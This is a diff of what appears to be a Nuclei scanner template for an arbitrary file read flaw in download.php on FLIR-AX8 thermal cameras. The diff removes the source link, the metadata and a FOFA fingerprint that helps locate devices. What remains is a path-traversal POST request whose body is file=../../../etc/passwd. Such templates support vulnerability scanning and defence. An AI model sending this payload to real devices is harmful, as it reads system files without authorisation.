@@ -3,12 +3,8 @@ info:
   name: FLIR-AX8热成像仪download.php存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zy79kzww1mi4ifrb'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zy79kzww1mi4ifrb
-    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
 http:
 - raw:
   - 'POST /download.php HTTP/1.1
@@ -36,9 +32,7 @@ http:
     Content-Length: 24
 
 
-    file=../../../etc/passwd
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728983548116-7f1e2c5e-c860-45cd-9f85-bd2c0083d746.png)'
+    file=../../../etc/passwd'
   redirects: false
   matchers:
   - status:
